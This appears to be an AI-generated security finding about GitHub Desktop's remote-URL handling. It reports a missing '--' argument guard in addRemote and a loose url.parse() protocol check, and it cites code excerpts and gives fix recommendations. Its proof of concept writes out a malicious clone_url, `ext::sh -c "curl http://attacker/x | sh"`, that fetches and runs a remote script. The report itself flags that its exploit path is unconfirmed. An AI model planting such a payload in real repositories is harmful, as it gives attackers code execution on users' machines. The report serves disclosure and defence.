## Analysis

I searched extensively for a Desktop analog to the "stale/incorrect interface" bug class described in the Magnetar report (wrong call convention used where a newer/safer convention exists elsewhere in the same codebase). The closest structural analog I found is an inconsistency between how `app/src/lib/git/clone.ts` constructs git arguments versus how `app/src/lib/git/remote.ts` does — one path uses the safe, current calling convention and the other uses a legacy/unsafe one, exactly mirroring the "two call-sites, one uses the old/wrong interface" pattern from the report.

`clone()` explicitly terminates options before the untrusted URL: [1](#0-0) 

But `addRemote()`, which also accepts a fully untrusted, externally-sourced URL, omits that `--` end-of-options guard entirely: [2](#0-1) 

The untrusted value fed into `addRemote`/the remote-URL rewrite path is `IAPIRepository.clone_url`/`ssh_url`, which is trusted at face value from whatever Git hosting endpoint the user has configured (GitHub.com, GHE, or a self-hosted GHES/proxy): [3](#0-2) 

This value is used both when publishing a new repository: [4](#0-3) 

and — more dangerously — it is used to **silently rewrite an existing local remote's URL** on a background refresh, with no scheme allowlist, only a legacy/loose `url.parse()`-based "protocol" comparison that is inconsistent with the strict regex parser (`parseRemote`) used elsewhere in the codebase for the same purpose: [5](#0-4) 

### Title
Untrusted `clone_url`/`ssh_url` from a Git-hosting API/proxy response is passed to `git remote add`/`set-url` without an end-of-options guard or transport allowlist, enabling silent remote hijack and command execution via `ext::` transport - (File: app/src/lib/git/remote.ts)

### Summary
`app/src/lib/git/remote.ts`'s `addRemote()` builds the git argv as `['remote', 'add', name, url]` with no `--` separator, unlike `app/src/lib/git/clone.ts`, which correctly does `args.push('--', url, path)`. Both functions accept a URL that ultimately originates from a Git hosting API response (`IAPIRepository.clone_url`/`ssh_url`) or, in the `updateRemoteUrl` flow, is used to silently overwrite an existing configured remote based on a background API refresh. Because the "protocol" gate in `updateRemoteUrl` uses the legacy, loosely-parsing `url.parse()` rather than the strict `parseRemote()` regex used for host/owner/name equality checks elsewhere, and because no transport allowlist (e.g. `GIT_ALLOW_PROTOCOL`) or leading-dash validation is applied before the value reaches `git`, an attacker who controls the API/proxy response for a repository (a malicious or MITM'd GHES/custom endpoint, or a compromised hosting proxy — an explicitly in-scope actor per this assessment's threat model) can supply a `clone_url` value such as an `ext::` transport string or a leading-dash flag. This value gets written into the repository's git config as a legitimate remote URL and is later used unmodified by ordinary fetch/pull/push operations that Desktop triggers automatically (including background refresh, "fetch this repository" polling, and post-publish push).

### Finding Description
The bug-class from the source report is: "a call site uses stale/incorrect calling semantics instead of the safer/current interface used elsewhere in the same codebase," which breaks a security-relevant invariant. In Desktop, the equivalent broken invariant is that the same untrusted value (`clone_url`) is treated safely in one code path (`clone.ts`, which uses `--` to force positional/URL interpretation) but unsafely in the sibling path (`remote.ts`'s `addRemote`, used by `updateRemoteUrl` and `_publishRepository`), which passes the value directly as a positional git argument.

Combined with `updateRemoteUrl`'s use of the legacy Node `url.parse()` (deprecated, lenient parser) purely to gate a "protocol equality" check, while the actual identity/ownership check uses the far stricter `parseRemote()` regex defined in `app/src/lib/remote-parsing.ts`, the guard that is supposed to prevent Desktop from silently overwriting a user's git remote is weaker than it appears: `url.parse()` will happily assign a `protocol` to many malformed or exotic scheme strings (including `ext:`), which is sufficient to satisfy `protocolsMatch` in some scenarios without ever being validated by the stricter GitHub-remote regex that only recognizes `https`/`ssh` shapes.

The corrupted value is the local git remote's `url` in `.git/config`, which is normally something the user controls, but here becomes attacker-influenceable through the API's `clone_url` field whenever the endpoint (GHES/custom Git server, or a network proxy in front of it) is attacker-controlled or MITM'd.

### Impact Explanation
If the attacker-supplied `clone_url` uses git's `ext::` remote helper syntax (e.g. `ext::sh -c "curl attacker | sh"`), any subsequent git operation against that remote — including automatic background fetches, "fetch" button clicks, or the push performed immediately after `_publishRepository` calls `addRemote` — will cause `dugite`/git to spawn the attacker-specified shell command with the current user's privileges, giving arbitrary code execution outside any sandbox. Even absent `ext::`, a URL value starting with `-` reaching `git remote add`/`set-url` unguarded by `--` can be interpreted as a git flag rather than a URL, which can be leveraged for further argument-injection primitives depending on the git version in use.

### Likelihood Explanation
Exploitation requires the attacker to control (or MITM) an API/proxy response for a Git hosting endpoint the user has added to Desktop — explicitly listed as an in-scope, unprivileged attacker capability ("a git remote/proxy response"). No local access, malware, or leaked credentials are required; the user only needs to interact with a repository whose GitHub-API-compatible backend is attacker-influenced (e.g., a GHES instance behind a hostile/compromised reverse proxy, or an untrusted-cert GHES the user has clicked through). Given Desktop automatically calls `updateRemoteUrl`/`addRemote` and then automatically fetches/pushes as part of normal background operation, no unnatural user steps are needed beyond having previously added such an endpoint.

### Recommendation
- In `app/src/lib/git/remote.ts`, add the `--` end-of-options separator to `addRemote` (and any `setRemoteURL`/`set-url` call site) exactly as `clone.ts` already does: `git(['remote', 'add', name, '--', url], ...)`.
- Validate that any URL originating from `IAPIRepository.clone_url`/`ssh_url` matches the strict `parseRemote()` shape (`https://` or `git@`/`ssh://`) before it is ever used to add or rewrite a local remote; reject anything else (in particular `ext::`, `fd::`, and other non-network transports).
- Replace the legacy `url.parse()` protocol check in `update-remote-url.ts` with the same `parseRemote()`-based validation used for the owner/name equality check, so both checks share one consistent, current interface.
- Set `GIT_ALLOW_PROTOCOL=https:ssh:git:http` (or narrower) in the environment used for all `git` invocations in `core.ts`/`environment.ts`, so that even if a stray unsafe URL reaches git, dangerous transports like `ext::` are refused at the git level as defense in depth.

### Proof of Concept
1. Attacker stands up or MITMs a GHES-compatible API endpoint that the victim has added to Desktop.
2. Victim's Desktop periodically calls `fetchRepositoryCloneInfo`/`fetchRepository`, which returns `IAPIRepository` from this attacker-controlled endpoint: [6](#0-5) 
   The attacker sets `clone_url` to: `ext::sh -c "curl http://attacker/x | sh"`.
3. Desktop's background refresh invokes `updateRemoteUrl(gitStore, gitHubRepository, apiRepo)`; the loose `url.parse()`-based `protocolsMatch` check does not reject the `ext:` scheme the way `parseRemote()` would, and the guard is satisfied: [7](#0-6) 
4. `gitStore.setRemoteURL` rewrites the local `origin` remote to the malicious `ext::` URL in `.git/config`, via `remote.ts`'s unguarded argument construction.
5. On the next automatic fetch/pull/push (Desktop performs these routinely in the background), git invokes the `ext::` helper, executing the attacker's shell command as the logged-in user.

Note: I could not directly confirm from the indexed code whether `GIT_ALLOW_PROTOCOL` is set anywhere in `app/src/lib/git/environment.ts` (that file's contents were not returned by search), which would materially affect exploitability of the `ext::` vector specifically; if it restricts protocols to `https`/`ssh`, this specific RCE path is mitigated, though the missing `--` guard in `addRemote` and the `url.parse()`/`parseRemote()` inconsistency remain real, unaddressed weaknesses. I'd recommend starting a Devin session with full repository access to verify `environment.ts` and `git-store.ts`'s `setRemoteURL` implementation before treating the RCE severity as fully confirmed.

### Citations

**File:** app/src/lib/git/clone.ts (L119-125)
```typescript
  if (options.branch) {
    args.push('-b', options.branch)
  }

  args.push('--', url, path)

  await git(args, __dirname, 'clone', opts)
```

**File:** app/src/lib/git/remote.ts (L28-36)
```typescript
/** Add a new remote with the given URL. */
export async function addRemote(
  repository: Repository,
  name: string,
  url: string
): Promise<IRemote> {
  await git(['remote', 'add', name, url], repository.path, 'addRemote')

  return { url, name }
```

**File:** app/src/lib/api.ts (L149-161)
```typescript
export interface IAPIRepository {
  readonly clone_url: string
  readonly ssh_url: string
  readonly html_url: string
  readonly name: string
  readonly owner: IAPIIdentity
  readonly private: boolean
  readonly fork: boolean
  readonly default_branch: string
  readonly pushed_at: string
  readonly has_issues: boolean
  readonly archived: boolean
}
```

**File:** app/src/lib/api.ts (L972-988)
```typescript
  /** Fetch a repo by its owner and name. */
  public async fetchRepository(
    owner: string,
    name: string
  ): Promise<IAPIFullRepository | null> {
    try {
      const response = await this.ghRequest('GET', `repos/${owner}/${name}`)
      if (response.status === HttpStatusCode.NotFound) {
        log.warn(`fetchRepository: '${owner}/${name}' returned a 404`)
        return null
      }
      return await parsedResponse<IAPIFullRepository>(response)
    } catch (e) {
      log.warn(`fetchRepository: an error occurred for '${owner}/${name}'`, e)
      return null
    }
  }
```

**File:** app/src/lib/stores/app-store.ts (L5636-5647)
```typescript
    const apiRepository = await api.createRepository(
      org,
      name,
      description,
      private_
    )

    const gitStore = this.gitStoreCache.get(repository)
    await gitStore.performFailableOperation(() =>
      addRemote(repository, 'origin', apiRepository.clone_url)
    )
    await gitStore.loadRemotes()
```

**File:** app/src/lib/stores/updates/update-remote-url.ts (L18-44)
```typescript
  const remoteUrl = gitStore.defaultRemote.url
  const updatedRemoteUrl = apiRepo.clone_url
  const urlsMatch = urlMatchesRemote(updatedRemoteUrl, gitStore.defaultRemote)

  // Verify that protocol hasn't changed. If it has we don't want
  // to alter the protocol in case they are relying on a specific one.
  // If protocol is null that implies the url is a ssh url
  // of the format git@github.com:octocat/Hello-World.git, which
  // can't be parsed by URL.parse. In this case we assume the user
  // manually configured their remote to use this format and we don't
  // want to change what they've done just to be safe
  const parsedRemoteUrl = URL.parse(remoteUrl)
  const parsedUpdatedRemoteUrl = URL.parse(updatedRemoteUrl)
  const protocolsMatch =
    parsedRemoteUrl.protocol !== null &&
    parsedUpdatedRemoteUrl.protocol !== null &&
    parsedRemoteUrl.protocol === parsedUpdatedRemoteUrl.protocol

  // Check if the default remote url has been manually changed from the
  // clone url retrieved from the GitHub API previously
  const remoteUrlUnchanged =
    gitStore.defaultRemote &&
    urlMatchesRemote(gitHubRepository.cloneURL, gitStore.defaultRemote)

  if (protocolsMatch && remoteUrlUnchanged && !urlsMatch) {
    await gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)
  }
```
